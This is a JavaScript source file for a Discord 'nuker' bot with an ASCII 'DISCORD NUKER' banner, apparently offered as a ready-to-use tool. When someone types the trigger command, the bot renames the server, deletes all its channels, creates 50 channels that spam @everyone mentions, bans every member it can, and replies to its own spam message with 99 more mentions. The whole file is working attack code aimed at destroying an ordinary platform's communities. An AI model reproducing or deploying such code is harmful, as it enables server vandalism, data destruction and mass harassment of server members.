const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const client = new Client({
	intents: [GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMessages]
});
const readline = require('readline-sync');

console.log(`██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`);

let YOUR_TOKEN = readline.question('YOUR_TOKEN: ');
let prefix = readline.question('prefix: ');
let name = readline.question('YOUR_NAME: ');
client.on('messageCreate', async (message) => {
    if (message.content === prefix+'nuke') {
        message.guild.setName(`nuked by ${name}`);
        message.guild.channels.cache.forEach((channel) => {
            channel.delete();
        });
        for (let i = 0; i < 50; i++) {
            const channel = await message.guild.channels.create({
                name: `nuked by ${name}`,
            })
            .then(async (channel) => {
                for (let i = 0; i < 1; i++) {
                    await channel.send(`@everyone\nnuked by ${name}`);
                };
            });
        };
    }
});

client.on('messageCreate', async (message) => {
    if (message.content === prefix+'nuke') {
        if (!message.member.permissions.has(PermissionsBitField.BAN_MEMBERS)) {
            return console.log('BAN権限がありません。');
        }
        message.guild.members.cache.forEach((member) => {
            member.ban({ reason: `nuked by ${name} `})
            .catch((error) => {
                console.error(`[ERROR] `, error.message);
            });
        });
    }
});

client.on('messageCreate', async (message) => {
    if (message.content === `@everyone\nnuked by ${name}`) {
        for (let i = 0; i <99; i++) {
            await message.channel.send(`@everyone\nnuked by ${name}!`);
        }
    }
});

client.login(YOUR_TOKEN);